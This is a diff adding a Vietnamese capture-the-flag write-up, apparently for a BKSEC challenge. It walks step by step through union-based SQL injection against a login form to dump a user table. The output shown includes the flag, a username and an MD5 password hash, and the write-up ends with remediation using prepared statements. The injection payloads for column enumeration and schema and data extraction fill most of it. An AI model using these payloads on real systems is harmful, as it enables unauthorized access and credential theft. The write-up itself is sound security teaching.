@@ -1,0 +1,252 @@
+## **📌 Mục Lục**
+1. [Phát hiện lỗ hổng](#1-phát-hiện-lỗ-hổng)
+2. [Xác định số lượng cột](#2-xác-định-số-lượng-cột)
+3. [Xác định cột hiển thị](#3-xác-định-cột-hiển-thị)
+4. [Khai thác thông tin database](#4-khai-thác-thông-tin-database)
+5. [Khai thác cấu trúc bảng](#5-khai-thác-cấu-trúc-bảng)
+6. [Khai thác dữ liệu](#6-khai-thác-dữ-liệu)
+7. [Phân tích kết quả](#7-phân-tích-kết-quả)
+8. [Kết luận](#8-kết-luận)
+
+---
+
+## **1. Phát hiện lỗ hổng**
+
+### **1.1. Kiểm tra SQL Injection cơ bản**
+
+**Payload:**
+```sql
+' UNION SELECT 1,2,3,4,5-- -
+```
+
+**Kết quả:** Trang báo lỗi → Phát hiện có thể số cột không đúng.
+
+### **1.2. Điều chỉnh số cột**
+
+**Payload:**
+```sql
+' UNION SELECT 1,2,3,4-- -
+```
+
+**Kết quả:** Login thành công và hiển thị `Hello, 2!`
+
+**Phân tích:**
+- Ứng dụng có **4 cột** trong query gốc
+- Cột số **2** được hiển thị trực tiếp ra màn hình
+- Có thể khai thác Union-based SQL Injection
+
+---
+
+## **2. Xác định số lượng cột**
+
+### **2.1. Dùng ORDER BY**
+```sql
+' ORDER BY 1-- -  (OK)
+' ORDER BY 2-- -  (OK)
+' ORDER BY 3-- -  (OK)
+' ORDER BY 4-- -  (OK)
+' ORDER BY 5-- -  (Lỗi)
+```
+
+**Kết luận:** Query gốc sử dụng **4 cột**.
+
+### **2.2. Xác nhận với NULL**
+```sql
+' UNION SELECT NULL,NULL,NULL,NULL-- -  (OK)
+' UNION SELECT NULL,NULL,NULL,NULL,NULL-- - (Lỗi)
+```
+
+**Kết luận:** Chính xác 4 cột.
+
+---
+
+## **3. Xác định cột hiển thị**
+
+### **3.1. Test từng cột**
+```sql
+' UNION SELECT 1,2,3,4-- -
+```
+
+**Kết quả:** `Hello, 2!`
+
+**Phân tích:** Chỉ có cột số 2 được hiển thị dữ liệu.
+
+### **3.2. Xác định phiên bản database**
+```sql
+' UNION SELECT 1,@@version,3,4-- -
+```
+
+**Kết quả:** `Hello, 9.6.0!`
+
+**Thông tin:** MySQL version 9.6.0
+
+---
+
+## **4. Khai thác thông tin database**
+
+### **4.1. Lấy tên database hiện tại**
+```sql
+' UNION SELECT 1,database(),3,4-- -
+```
+
+### **4.2. Liệt kê các bảng**
+```sql
+' UNION SELECT 1,table_name,3,4 FROM information_schema.tables WHERE table_schema=database()-- -
+```
+
+**Kết quả:** `Hello, user_info!`
+
+**Phân tích:** Phát hiện bảng `user_info`
+
+### **4.3. Đếm số lượng bảng**
+```sql
+' UNION SELECT 1,COUNT(*),3,4 FROM information_schema.tables WHERE table_schema=database()-- -
+```
+
+**Kết quả:** `Hello, 1!` → Chỉ có 1 bảng `user_info`
+
+---
+
+## **5. Khai thác cấu trúc bảng user_info**
+
+### **5.1. Đếm số cột trong bảng**
+```sql
+' UNION SELECT 1,COUNT(*),3,4 FROM information_schema.columns WHERE table_name='user_info'-- -
+```
+
+**Kết quả:** `Hello, 4!` → Bảng có 4 cột
+
+### **5.2. Xác định tên các cột**
+
+**Cột 1:**
+```sql
+' UNION SELECT 1,column_name,3,4 FROM information_schema.columns WHERE table_name='user_info' LIMIT 0,1-- -
+```
+→ **id**
+
+**Cột 2:**
+```sql
+' UNION SELECT 1,column_name,3,4 FROM information_schema.columns WHERE table_name='user_info' LIMIT 1,1-- -
+```
+→ **name**
+
+**Cột 3:**
+```sql
+' UNION SELECT 1,column_name,3,4 FROM information_schema.columns WHERE table_name='user_info' LIMIT 2,1-- -
+```
+→ **uname** (username)
+
+**Cột 4:**
+```sql
+' UNION SELECT 1,column_name,3,4 FROM information_schema.columns WHERE table_name='user_info' LIMIT 3,1-- -
+```
+→ **pwd** (password)
+
+### **5.3. Cấu trúc bảng hoàn chỉnh**
+```sql
+user_info (
+    id INT,
+    name VARCHAR,
+    uname VARCHAR,
+    pwd VARCHAR
+)
+```
+
+---
+
+## **6. Khai thác dữ liệu**
+
+### **6.1. Kiểm tra dữ liệu trong bảng**
+```sql
+' UNION SELECT 1,'has data',3,4 FROM user_info LIMIT 1-- -
+```
+→ `Hello, has data!` → Bảng có dữ liệu
+
+### **6.2. Đếm số dòng**
+```sql
+' UNION SELECT 1,CONCAT('Row count: ', COUNT(*)),3,4 FROM user_info-- -
+```
+→ `Row count: 132` → 132 tài khoản
+
+### **6.3. Lấy dòng đầu tiên**
+```sql
+' UNION SELECT 1,CONCAT(id, ' | ', name, ' | ', uname, ' | ', pwd),3,4 FROM user_info LIMIT 0,1-- -
+```
+
+**Kết quả:**
+```
+Hello, 1 | BKSEC{c0nv3n13nc3_1nv3rs3_pr0p0rt10n4l_t0_s3cur1ty_huh_b7e4c1} | teebow1e | 521b04082eb661f55a5152dfdfce3844!
+```
+
+### **6.4. Phân tích dữ liệu thu được**
+
+| Cột | Giá trị |
+|-----|---------|
+| id | 1 |
+| name | **BKSEC{c0nv3n13nc3_1nv3rs3_pr0p0rt10n4l_t0_s3cur1ty_huh_b7e4c1}** (FLAG) |
+| uname | teebow1e |
+| pwd | 521b04082eb661f55a5152dfdfce3844 (MD5 hash) |
+
+---
+
+## **7. Phân tích kết quả**
+
+### **7.1. Flag tìm được**
+```
+BKSEC{c0nv3n13nc3_1nv3rs3_pr0p0rt10n4l_t0_s3cur1ty_huh_b7e4c1}
+```
+
+
+## **8. Kết luận**
+
+### **8.1. Tóm tắt quá trình khai thác**
+1. **Phát hiện:** SQL Injection qua trường login
+2. **Xác định số cột:** 4 cột với ORDER BY và UNION SELECT NULL
+3. **Xác định cột hiển thị:** Cột số 2 hiển thị dữ liệu
+4. **Xác định phiên bản:** MySQL 9.6.0
+5. **Khai thác database:** Tìm được bảng `user_info`
+6. **Khai thác cấu trúc:** 4 cột: id, name, uname, pwd
+7. **Khai thác dữ liệu:** Lấy được flag từ dòng đầu tiên
+
+### **8.2. Bài học rút ra**
+- **Input validation** là cực kỳ quan trọng
+- **Prepared statements** cần được sử dụng thay vì dynamic query
+- **Principle of least privilege** cho database user
+- **Error messages** không nên hiển thị chi tiết cho người dùng
+
+### **8.3. Khắc phục lỗ hổng**
+```php
+// Thay vì:
+$query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
+
+// Sử dụng Prepared Statement:
+$stmt = $conn->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
+$stmt->bind_param("ss", $username, $password);
+$stmt->execute();
+```
+
+---
+
+## **📊 Flowchart khai thác**
+
+```
+Start
+  ↓
+Phát hiện SQL Injection
+  ↓
+Xác định số cột (4)
+  ↓
+Xác định cột hiển thị (cột 2)
+  ↓
+Lấy version (MySQL 9.6.0)
+  ↓
+Liệt kê bảng (user_info)
+  ↓
+Liệt kê cột (id, name, uname, pwd)
+  ↓
+Khai thác dữ liệu
+  ↓
+[FLAG] BKSEC{...}
+  ↓
+End
+```
